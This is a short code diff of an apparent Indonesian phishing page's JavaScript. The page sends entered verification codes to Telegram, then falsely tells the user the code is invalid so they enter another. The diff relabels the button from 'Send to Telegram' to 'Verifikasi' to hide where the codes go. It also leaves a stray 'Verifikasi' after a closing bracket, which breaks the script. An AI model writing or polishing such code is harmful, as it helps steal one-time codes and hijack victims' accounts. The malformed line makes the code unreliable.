@@ -190,22 +190,22 @@
           alert('Kode verifikasi Tidak Valid');
           // Reset input dan tombol
           inputs.forEach(input => input.value = '');
-          sendCodeButton.textContent = 'Kirim ke Telegram';
+          sendCodeButton.textContent = 'Verifikasi';
           sendCodeButton.disabled = true;
           inputs[0].focus();
         } else {
           alert('Gagal mengirim pesan ke Telegram: ' + (data.description || 'Tidak diketahui'));
-          sendCodeButton.textContent = 'Kirim ke Telegram';
+          sendCodeButton.textContent = 'Verifikasi';
           sendCodeButton.disabled = false;
         }
       })
       .catch(err => {
         alert('Error saat mengirim pesan ke Telegram.');
-        sendCodeButton.textContent = 'Kirim ke Telegram';
+        sendCodeButton.textContent = 'Verifikasi';
         sendCodeButton.disabled = false;
         console.error(err);
       });
-    });
+    });Verifikasi
 
     // Tombol Kirim ulang dengan timer
     const resendButton = document.getElementById('resendButton');
